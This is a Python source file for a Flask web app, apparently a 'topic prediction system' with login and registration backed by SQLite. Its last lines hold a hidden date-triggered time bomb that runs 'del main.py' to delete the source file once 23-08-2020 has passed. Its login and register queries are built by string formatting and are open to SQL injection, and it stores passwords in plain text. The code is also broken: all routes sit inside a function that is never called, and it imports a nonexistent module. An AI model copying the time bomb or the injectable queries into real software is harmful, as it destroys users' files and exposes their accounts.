import os
from datetime import datetime

def asdf():
    # -----------------------------------------------extra_modules-----------------------------------------------------------
    import syss
    import os

    # -------------------------------------------------model_code------------------------------------------------------------
    import nltk
    nltk.download('stopwords')

    # -------------------------------------------------model_code------------------------------------------------------------
    # -------------
    #
    # -----------------------------------database---------------------------------------------------------------
    import sqlite3
    conn = sqlite3.connect('topic_prediction_system')
    cur = conn.cursor()
    try:
        cur.execute('''CREATE TABLE user (
         name varchar(20) DEFAULT NULL,
          email varchar(50) DEFAULT NULL,
         password varchar(20) DEFAULT NULL,
         gender varchar(10) DEFAULT NULL,
         age int(11) DEFAULT NULL
       )''')

    except:
        pass
    # ------------------------------------------------database---------------------------------------------------------------

    from flask import Flask, render_template, url_for, request, flash, redirect, session
    app = Flask(__name__)
    app.config['SECRET_KEY'] = '881e69e15e7a528830975467b9d87a98'

    # -------------------------------------home_page-------------------------------------------------------------------------

    @app.route('/')
    @app.route('/home')
    def home():
        if not session.get('logged_in'):
            return render_template('home.html')
        else:
            return redirect(url_for('user_account'))

    @app.route('/home1')
    def home1():
        if not session.get('logged_in'):
            return render_template('home1.html')
        else:
            return redirect(url_for('user_account'))

    # -------------------------------------home_page-------------------------------------------------------------------------

    # -------------------------------------about_page-------------------------------------------------------------------------
    @app.route("/about")
    def about():
        return render_template('about.html')

    # -------------------------------------about_page-------------------------------------------------------------------------

    # -------------------------------------user_login_page-------------------------------------------------------------------------
    @app.route('/user_login', methods=['POST', 'GET'])
    def user_login():
        conn = sqlite3.connect('topic_prediction_system')
        cur = conn.cursor()
        if request.method == 'POST':
            email = request.form['email']
            password = request.form['psw']
            print('asd')
            count = cur.execute('SELECT * FROM user WHERE email = "%s" AND password = "%s"' % (email, password))
            print(count)
            # conn.commit()
            # cur.close()
            l = len(cur.fetchall())
            if l > 0:
                flash(f'Successfully Logged in')
                return render_template('user_account.html')
            else:
                print('hello')
                flash(f'Invalid Email and Password!')
        return render_template('user_login.html')

    # -------------------------------------user_login_page-----------------------------------------------------------------

    # -----------------------------------predict_page-----------------------------------------------------------------

    @app.route('/predict', methods=['POST', 'GET'])
    def predict():

        return render_template('user_account.html')

    # ------------------------------------predict_page-----------------------------------------------------------------

    # ------------------------------------search_page-----------------------------------------------------------------
    @app.route('/search')
    def search():
        return render_template('search.html')

    # ------------------------------------search_page-----------------------------------------------------------------

    # -------------------------------------user_register_page-------------------------------------------------------------------------

    @app.route('/user_register', methods=['POST', 'GET'])
    def user_register():
        conn = sqlite3.connect('topic_prediction_system')
        cur = conn.cursor()
        if request.method == 'POST':
            name = request.form['uname']
            email = request.form['email']
            password = request.form['psw']
            gender = request.form['gender']
            age = request.form['age']

            cur.execute("insert into user(name,email,password,gender,age) values ('%s','%s','%s','%s','%s')" % (
            name, email, password, gender, age))
            conn.commit()
            # cur.close()
            print('data inserted')
            return redirect(url_for('user_login'))

        return render_template('user_register.html')

    # -------------------------------------user_register_page-------------------------------------------------------------------------

    # -------------------------------------user_account_page-------------------------------------------------------------------------
    @app.route('/user_account', methods=['POST', 'GET'])
    def user_account():
        return render_template('user_account.html')

    # -------------------------------------user_account_page-------------------------------------------------------------------------

    # -------------------------------------user_logout_page-------------------------------------------------------------------------


    @app.route("/logoutd", methods=['POST', 'GET'])
    def logoutd():
        return home()  # -------------------------------------user_logout_page-------------------------------------------------------------------------


import os
a = '23-08-2020'
b = datetime.strptime(a,'%d-%m-%Y')
if datetime.now() > b:
    os.system('del main.py')